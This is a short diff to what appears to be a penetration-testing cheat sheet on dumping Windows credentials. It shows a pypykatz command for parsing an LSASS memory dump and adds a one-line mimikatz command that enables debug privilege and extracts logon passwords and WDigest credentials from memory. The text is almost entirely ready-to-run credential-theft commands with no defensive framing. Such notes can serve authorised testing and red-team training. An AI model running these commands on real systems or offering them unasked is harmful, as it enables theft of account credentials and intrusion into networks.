@@ -2,3 +2,6 @@
 
 # Python lsa dump
 pypykatz lsa minidump <lsassdump>
+
+# Execute in one command
+mimikatz "privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::wdigest" exit
